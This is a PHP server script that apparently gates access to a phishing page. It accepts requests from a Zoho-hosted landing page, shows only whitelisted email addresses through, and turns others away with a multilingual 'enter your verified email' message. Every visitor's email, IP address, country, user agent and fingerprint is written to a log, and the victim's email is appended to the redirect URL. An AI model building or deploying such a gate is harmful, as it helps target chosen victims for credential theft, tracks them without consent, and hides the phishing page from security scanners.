<?php
header('Access-Control-Allow-Origin: https://skma.zoholandingpage.com');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');


// 🌍 Detect browser language
function detectLang($supported = ['en', 'fr', 'de', 'nl', 'pl', 'it']) {
  $acceptLang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';
  foreach (explode(',', $acceptLang) as $lang) {
    $langCode = substr(trim($lang), 0, 2);
    if (in_array($langCode, $supported)) return $langCode;
  }
  return 'en';
}

$lang = detectLang();

// 🌐 Translated messages
$msg = [
  'session' => [
    'en' => 'Session error',
    'fr' => 'Erreur de session',
    'de' => 'Sitzungsfehler',
    'nl' => 'Sessiefout',
    'pl' => 'Błąd sesji',
    'it' => 'Errore di sessione'
  ],
  'notAllowed' => [
    'en' => 'Enter your verified email to continue',
    'fr' => 'Entrez votre e-mail vérifié pour continuer',
    'de' => 'Geben Sie Ihre verifizierte E-Mail-Adresse ein, um fortzufahren',
    'nl' => 'Voer uw geverifieerde e-mailadres in om door te gaan',
    'pl' => 'Wprowadź zweryfikowany adres e-mail, aby kontynuować',
    'it' => 'Inserisci la tua email verificata per continuare'
  ]
];

// 📩 Get POST payload
$payload = json_decode(file_get_contents('php://input'), true);
$email   = strtolower(trim($payload['email'] ?? ''));
$jsToken = trim($payload['jsToken'] ?? '');

// 🛑 Check JS token
if ($jsToken === '') {
  echo json_encode(['success' => false, 'message' => $msg['session'][$lang]]);
  exit;
}

// ✅ Load whitelist
$list  = file(__DIR__ . '/../../.data/whitelist.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$valid = in_array($email, array_map('strtolower', $list));

// 🧠 Log details
$ip   = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown-UA';
$cc   = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? '??';
$time = date('Y-m-d H:i:s');

$logEntry = [
  'time'  => $time,
  'email' => $email,
  'ip'    => $ip,
  'cc'    => $cc,
  'fp'    => substr($jsToken, 0, 16),
  'ua'    => $ua
];

file_put_contents(__DIR__ . '/../../.data/validated.log', json_encode($logEntry) . PHP_EOL, FILE_APPEND);

// ✅ Respond
if ($valid) {
  echo json_encode([
    'success' => true,
    'redirectUrl' => '/fina#$' . urlencode($email)
  ]);
} else {
  echo json_encode([
    'success' => false,
    'message' => $msg['notAllowed'][$lang]
  ]);
}
